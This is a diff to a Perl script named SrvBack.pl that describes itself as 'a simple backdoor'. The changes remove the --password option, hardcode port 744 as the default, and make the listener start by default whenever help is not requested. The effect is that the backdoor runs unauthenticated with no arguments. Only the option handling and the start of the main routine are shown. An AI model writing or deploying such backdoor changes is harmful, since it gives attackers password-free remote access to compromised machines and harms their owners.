@@ -12,8 +12,7 @@ my $helpText = "
 Description : This is a simple backdoor
 
 Usage : \n
---password | -p\t: password to use
---port     |   \t: port to use (default port of protocol)
+--port     |   \t: port to use (default port : 744)
 --help     | -h\t: print this help
 --verbose  | -v\t: print more verbose
 
@@ -21,7 +20,7 @@ Usage : \n
 
 \n\nExample :
 
-perl SrvBack.pl --port 34232
+perl SrvBack.pl --port 744
 ";
 
 my $versionText = "
@@ -36,12 +35,11 @@ Developers assume no liability and are not responsible for any misuse or damage 
 my $help;
 my $version;
 my $verbose;
-my $port;
+my $port = 744;
 my $password;
 my $soc;
 
 GetOptions(
-    'password|p=s' => \$password,    # string
     'port=i'       => \$port,        # int
     'version'      => \$version,     # flag
     'verbose|v'    => \$verbose,     # flag
@@ -54,7 +52,7 @@ sub main()
     {
         print($helpText);
     }
-    elsif ( defined $port )
+    elsif ( !defined $help )
     {
         my $tmpSoc;
 
